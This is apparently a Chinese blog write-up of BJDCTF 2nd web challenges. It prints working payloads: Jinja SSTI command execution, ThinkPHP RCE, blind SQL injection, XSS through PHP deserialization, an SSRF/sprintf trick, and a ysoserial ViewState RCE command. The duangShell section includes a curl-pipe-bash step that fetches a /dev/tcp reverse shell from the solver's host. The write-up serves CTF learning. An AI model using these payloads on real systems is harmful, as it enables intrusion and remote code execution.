---
title: BJDCTF 2nd Web
urlname: bjdctf-2nd-web
tags: BUU
abbrlink: 15918
date: 2021-04-20 20:35:49
---

# BJDCTF 2nd 

## Web

### Fake google

```bash
/qaq?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```



### old-hack

```
http://c7c26058-4d64-4b02-be14-c7aaad68e492.node3.buuoj.cn/?s=1
```

```bash
/?s=captcha
_method=__construct&filter[]=system&method=get&get[]=cat /flag
```



### 假猪套天下第一

强行让我学到了很多关于http的header。也理解为什么这个标题叫这个了，好活。

开始时以为是sql注入得到admin，实际上是登陆其他用户即可，抓包响应页面的最底下有个注释。(加粗部分为本题需使用的头)

| Header              | 解释                                                         | 示例                                                         |
| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| Accept              | 指定客户端能够接收的内容类型                                 | Accept: text/plain, text/html,application/json               |
| Accept-Charset      | 浏览器可以接受的字符编码集。                                 | Accept-Charset: iso-8859-5                                   |
| Accept-Encoding     | 指定浏览器可以支持的web服务器返回内容压缩编码类型。          | Accept-Encoding: compress, gzip                              |
| Accept-Language     | 浏览器可接受的语言                                           | Accept-Language: en,zh                                       |
| Accept-Ranges       | 可以请求网页实体的一个或者多个子范围字段                     | Accept-Ranges: bytes                                         |
| Authorization       | HTTP授权的授权证书                                           | Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==            |
| Cache-Control       | 指定请求和响应遵循的缓存机制                                 | Cache-Control: no-cache                                      |
| Connection          | 表示是否需要持久连接。（HTTP 1.1默认进行持久连接）           | Connection: close                                            |
| **Cookie**          | HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。 | Cookie: $Version=1; Skin=new;                                |
| Content-Length      | 请求的内容长度                                               | Content-Length: 348                                          |
| Content-Type        | 请求的与实体对应的MIME信息                                   | Content-Type: application/x-www-form-urlencoded              |
| **Client-ip**       | A common requirement is to access the real client address from the server. | Client-ip: 127.0.0.1                                         |
| Date                | 请求发送的日期和时间                                         | Date: Tue, 15 Nov 2010 08:12:31 GMT                          |
| Expect              | 请求的特定的服务器行为                                       | Expect: 100-continue                                         |
| **From**            | 发出请求的用户的Email                                        | From: user@email.com                                         |
| Host                | 指定请求的服务器的域名和端口号                               | Host: www.zcmhi.com                                          |
| If-Match            | 只有请求内容与实体相匹配才有效                               | If-Match: “737060cd8c284d8af7ad3082f209582d”                 |
| If-Modified-Since   | 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码 | If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT             |
| If-None-Match       | 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变 | If-None-Match: “737060cd8c284d8af7ad3082f209582d”            |
| If-Range            | 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag | If-Range: “737060cd8c284d8af7ad3082f209582d”                 |
| If-Unmodified-Since | 只在实体在指定时间之后未被修改才请求成功                     | If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT           |
| Max-Forwards        | 限制信息通过代理和网关传送的时间                             | Max-Forwards: 10                                             |
| Pragma              | 用来包含实现特定的指令                                       | Pragma: no-cache                                             |
| Proxy-Authorization | 连接到代理的授权证书                                         | Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==      |
| Range               | 只请求实体的一部分，指定范围                                 | Range: bytes=500-999                                         |
| **Referer**         | 先前网页的地址，当前请求网页紧随其后,即来路                  | Referer: [http://www.zcmhi.com/archives...](http://www.zcmhi.com/archives/71.html) |
| TE                  | 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息     | TE: trailers,deflate;q=0.5                                   |
| **Upgrade**         | 向服务器指定某种传输协议以便服务器进行转换（如果支持）       | Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11               |
| **User-Agent**      | User-Agent的内容包含发出请求的用户信息                       | User-Agent: Mozilla/5.0 (Linux; X11)                         |
| **Via**             | 通知中间网关或代理服务器地址，通信协议                       | Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)                  |
| Warning             | 关于消息实体的警告信息                                       | Warn: 199 Miscellaneous warning                              |



### 简单注入

扫描一遍网站，发现hint.txt。

发现过滤字符时，网站会alert一个stophacking。例如等号。

没有等号，可以试试网上的二分法求解。

`password=or/**/length(database())>0#&username=admin\`

判断成功，页面上出现xxx需要变得stronger。

判断无效，页面仍然是girlfriend。



### XSS之光

> 知识点： git泄露、反序列化漏洞、XSS

反序列化漏洞需要借助代码中的对象，由于泄露的代码中并没有对象，故而我们使用PHP内置的对象，类似于PWN的ROP。

7.0以上的版本可以用`Error`类，5.0或者7.0以上的可以用`Exception`类，因此`Exception`类更为适用。

```php
$a = new Exception("<script>window.location.href='https://github.com'</script>");
$b = serialize($a);
echo urlencode($b);

?yds_is_so_beautiful=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A58%3A%22%3Cscript%3Ewindow.location.href%3D%27https%3A%2F%2Fgithub.com%27%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D


```



本题在触发XSS后会在本在内的cookies显示flag。

[【拓展】反序列化之PHP原生类的利用](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html)



### ElementMaster

> 知识点： 元素周期表、火眼金睛

开始研究图片研究半天，看了下源码，源码有两个可疑id，直接给他上十六进制转字符串。

```转换如下
506F2E  Po.
706870  php
```

怀疑是不是自己整错了，`Po.` 能有什么坏心思呢？看了下别人的wp发现是没错的，而且这是元素周期表中的钋元素，好家伙，很结合主题。题目的意思是遍历一遍元素周期表。那我也顺便学学别人是怎么写的吧。虽然不知道原作者是谁，但是由衷感谢。

```python
#coding:utf-8
import requests

url='http://c411b4fc-2454-4132-99db-dea01c5835c9.node3.buuoj.cn/'
flag=''
element=['H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar',
        'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br',
        'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te',
        'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm',
        'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn',
        'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr',
        'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue']

for i in element:
        r=requests.get(url+i+'.php')
        if r.status_code == 200:
                page+=r.text
                print (page)
```

然后爆出一个路径，直接访问得到flag。



### Schrödinger

开始时审查了元素，发现了`test.php`页面，按照里面的提示（I left some good for you in my admin passwd.）我不进行SQL注入，而是尝试一波常用密码找回（狗头）。

cookie中的`dXNlcg`变量解码后怀疑是时间戳。

cookie中的`dXNlcg`变量与`Forecast success rate`正比关系。

Burst successed! The passwd is av11664517@1583985203.

密码放上去一直是错，不过看到这个av开头的数值我第一想到时B站的视频，看评论找了很久。

![image-20210419191518562](https://z3.ax1x.com/2021/04/21/cbMNq0.png)



### duangShell

> 知识点： 代码泄露、反弹shell

题目提示swp泄露了，给他点面子，进入`.index.php.swp`页面。下载后`vim -r index.php`打开。

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>give me a girl</title>
</head>
<body>
    <center><h1>珍爱网</h1></center>
</body>
</html>
<?php
error_reporting(0);
echo "how can i give you source code? .swp?!"."<br>";
if (!isset($_POST['girl_friend'])) {
    die("where is P3rh4ps's girl friend ???");
} else {
    $girl = $_POST['girl_friend'];
    if (preg_match('/\>|\\\/', $girl)) {
        die('just girl');
    } else if (preg_match('/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i', $girl)) {
        echo "<img src='img/p3_need_beautiful_gf.png'> <!-- He is p3 -->";
    } else {
        //duangShell~~~~
        exec($girl);
    }
}
```

过滤了挺多东西的，而且没回显，我只能想到用`curl`来反弹shell。

在自己的公网机子里放入bash.txt，内容如下。

```bash
bash -i >& /dev/tcp/you_ip/9999 0>&1
```

然后在自己机子里侦听`9999`

```bash
nc -lvnp 9999
```

在payload填充

```
girl_friend=curl+http://your_IP/bash.txt+|+bash
```

最后用`find`来寻找真flag。

```bash
$find / -name flag 
/etc/demo/P3rh4ps/love/you/flag

```

拓展：

[文件源码泄漏大全](https://ntwyc2018.github.io/2018/07/06/yuanma/)

[常见的Web源码泄漏漏洞及其利用](https://www.secpulse.com/archives/124398.html)



### 文件探测*

> 知识点：robots、请求头、php伪协议、代码审计、格式化输出注入、session与cookie的关系、真伪随机数

考点很多，这道题还是有点**值得推荐**的。



robots.txt

```
User-agent: *
Disallow: /flag.php
Disallow: /admin.php
Allow: /index.php
```

访问`admin.php`页面说是要本地访问，xff、client-ip什么的都没有用途，可能是用`remoteaddr`的，所以打算先放一下。

据说做BJD的题要一直开着F12，发现回显报文中有hint，指向了`home.php`。进入后指定定向`home.php?file=system`。

试了一下`file=index`，管理员骂骂咧咧地关闭了站点。（不是）发现回显多了个`.fxxkyou`不得不说出题人很素质，为避免伤了我们的心还打上了码。其他类似的我们尝试了`flag`会回显`not now`，`admin`会回显不是管理等等。

试过一段时间后想到有可能是文件包含，那可以试试伪协议，于是/home.php?file=php://filter/convert.base64-encode/resource=system，得到system的源码，home的也得到了，其他被home的业务逻辑限制了。

```php
// system.php
<?php
error_reporting(0);
if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){
    echo "<script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');</script>";
    header("Refresh:0.1;url=index.php");
    die;
}

$str2 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;url invalid<br>~$ ';
$str3 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;damn hacker!<br>~$ ';
$str4 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;request method error<br>~$ ';

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Detector</title>

    <link rel="stylesheet" type="text/css" href="css/normalize.css" />
    <link rel="stylesheet" type="text/css" href="css/demo.css" />

    <link rel="stylesheet" type="text/css" href="css/component.css" />

    <script src="js/modernizr.custom.js"></script>

</head>
<body>
<section>
    <form id="theForm" class="simform" autocomplete="off" action="system.php" method="post">
        <div class="simform-inner">
            <span><p><center>File Detector</center></p></span>
            <ol class="questions">
                <li>
                    <span><label for="q1">你知道目录下都有什么文件吗?</label></span>
                    <input id="q1" name="q1" type="text"/>
                </li>
                <li>
                    <span><label for="q2">请输入你想检测文件内容长度的url</label></span>
                    <input id="q2" name="q2" type="text"/>
                </li>
                <li>
                    <span><label for="q1">你希望以何种方式访问？GET？POST?</label></span>
                    <input id="q3" name="q3" type="text"/>
                </li>
            </ol>
            <button class="submit" type="submit" value="submit">提交</button>
            <div class="controls">
                <button class="next"></button>
                <div class="progress"></div>
                <span class="number">
					<span class="number-current"></span>
					<span class="number-total"></span>
				</span>
                <span class="error-message"></span>
            </div>
        </div>
        <span class="final-message"></span>
    </form>
    <span><p><center><a href="https://gem-love.com" target="_blank">@颖奇L'Amore</a></center></p></span>
</section>

<script type="text/javascript" src="js/classie.js"></script>
<script type="text/javascript" src="js/stepsForm.js"></script>
<script type="text/javascript">
    var theForm = document.getElementById( 'theForm' );

    new stepsForm( theForm, {
        onSubmit : function( form ) {
            classie.addClass( theForm.querySelector( '.simform-inner' ), 'hide' );
            var messageEl = theForm.querySelector( '.final-message' );
            form.submit();
            messageEl.innerHTML = 'Ok...Let me have a check';
            classie.addClass( messageEl, 'show' );
        }
    } );
</script>

</body>
</html>
<?php

$filter1 = '/^http:\/\/127\.0\.0\.1\//i';
$filter2 = '/.?f.?l.?a.?g.?/i';


if (isset($_POST['q1']) && isset($_POST['q2']) && isset($_POST['q3']) ) {  //q1没什么用，但必须有值。
    $url = $_POST['q2'].".y1ng.txt";	// q2终将影响 filter1、2的判定。被强行加上的帽子可以用’#‘或者’?params=‘等摘下。
    $method = $_POST['q3'];		// q3与最后的的sprintf有一定联系，需要加以利用。

    $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei<br>";

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2); //一定要是http://127.0.0.1/
    }
    if (preg_match($filter2, $url)) {
        die($str3);	// 换句话就是不能有flag等字样 ffllaagg等也不行。
    }
    if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) {
        die($str4); // 除了GET、POST打头都不要
    }
    $detect = @file_get_contents($url, false); // 第二个参数是use_include_path，这里false表示取消在include_path中寻找文件。
    print(sprintf("$url method&content_size:$method%d", $detect));
    /* 从函数文档中我们能了解到 
    	”the argument is treated as an integer and presented as a (signed) decimal number.“
    	参数会被当做一个整数呈现为十六进制数
    	但是前面还有个method我们可以利用，我们可以让q3=GET%s%
    	构造出这样的字符串GET%s%%d，两个百分号让百分号的转义失去效果，而使其只有%s，有效地输出字符串。
    */
}

?>

```

而home长这样。

```php
<?php

setcookie("y1ng", sha1(md5('y1ng')), time() + 3600);
setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600);

if(isset($_GET['file'])){
    if (preg_match("/\^|\~|&|\|/", $_GET['file'])) {
        die("forbidden");
    }

    if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
        die("not now!");
    }

    if(preg_match("/.?a.?d.?m.?i.?n.?/i", $_GET['file'])){
        die("You! are! not! my! admin!");
    }

    if(preg_match("/^home$/i", $_GET['file'])){
        die("禁止套娃");
    }

    else{
        if(preg_match("/home$/i", $_GET['file']) or preg_match("/system$/i", $_GET['file'])){
            $file = $_GET['file'].".php";
        }
        else{
            $file = $_GET['file'].".fxxkyou!";
        }
        echo "现在访问的是 ".$file . "<br>";
        require $file;
    }
} else {
    echo "<script>location.href='./home.php?file=system'</script>";
}
```

审查代码后，可以了解我们不能直接得到flag.php等带有flag字样的文件，不能在home中得到admin文件，那么试着在system中获取admin文件。详情看代码中的注释。

```bash
q1=a&q2=http://127.0.0.1/admin.php?b=&q3=GET%s%
```

在`system`中，通过这样的payload，我们获得了admin的源码。

```php
<?php
error_reporting(0);
session_start();
$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fake

function aesEn($data, $key)
{
    // 加密函数
    $method = 'AES-128-CBC';
    $iv = md5($_SERVER['REMOTE_ADDR'],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE['your_ip_address']) && $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) && $_COOKIE['y1ng'] === sha1(md5('y1ng')))
        // 这两个cookie不能丢
        return true;
    else
        return false;
}

if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} else {
    echo "<head><title>403 Forbidden</title></head><body bgcolor=black><center><font size='10px' color=white><br>only 127.0.0.1 can access! You know what I mean right?<br>your ip address is " . $_SERVER['REMOTE_ADDR'];
    # 原来如此，这句话无论如何会存在。
}


$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);

if (isset($_GET['decrypt'])) {
    $decr = $_GET['decrypt'];
    if (Check()){
        # 两个cookie确认存在后进行下一步
        $data = $_SESSION['secret'];
        include 'flag_2sln2ndln2klnlksnf.php';
        $cipher = aesEn($data, 'y1ng');
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
            // 这是我们的目标
        } else {
            die('爬');
        }
    } else{
        header("Refresh:0.1;url=index.php");
    }
} else {
    //I heard you can break PHP mt_rand seed
    //好家伙，上面这句话是陷阱
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION['secret'] = bin2hex(random_bytes($length));
    # random_bytes 是php7之后的事情
    # 这样的构造基本可以当作真随机
}


?>
```

看了一遍代码后第一个想到是mt的伪随机，但是这里的结构已经可以接近真随机了。

不过好在secret是存放在session中的，而session依赖于cookie中的sessionid，依靠这个关系我们把sessionid置空可以使该session对应键的值为NULL，这样data就是可控的了。

在本地使用aseEn函数（记得修改iv变量）构造出`decrypt=OGiyKXIyhghrDCtpomyQ6A==`，置空对应cookies，完事。

![image-20210421132550213](https://z3.ax1x.com/2021/04/21/cbMwIU.png)



参考：

[解析php sprintf函数漏洞](https://www.cnblogs.com/qingwuyou/p/10687463.html)

拓展：

[PHP trick](https://www.jianshu.com/p/9c031dee57b7)



### EasyAspDotNet

ASP渣在此观望。

点击`click`，进入一个新页面，有了图片，改了图片的uri发现有四张图。

查看源码，发现`input`中的`value`类似`base`，而且是变化的。

用来包含图片的脚本可以包含其他不止图片的文件`ImgLoad.aspx?path=1.png`

例如包含`web.config`? `ImgLoad.aspx?path=../../web.config`，直接用view-source下载下来。

这里已知一个RCE洞，可以使用`ysoserial`来反序列化。微软官方是这么描述的。

> #### Microsoft Exchange 验证密钥远程执行代码漏洞
>
> 当服务器在安装时无法正确创建唯一密钥时，Microsoft Exchange Server 中将存在一个远程执行代码漏洞。
>
> 知道验证密钥后，具有邮箱的认证用户可以传递要由 Web 应用程序反序列化的任意对象，该 Web 应用程序以“系统”身份运行。

现在利用刚刚的`web.config`构造payload反序列化后进行远程代码执行。

```bash
.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;./System.dll;./System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"
```

将payload用post方法传入`__VIEWSTATE`中，再使用`cmd`参数用来执行指令即可。



工具：

[ysoserial](https://github.com/pwntester/ysoserial.net)

参考：

[玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門](https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/)





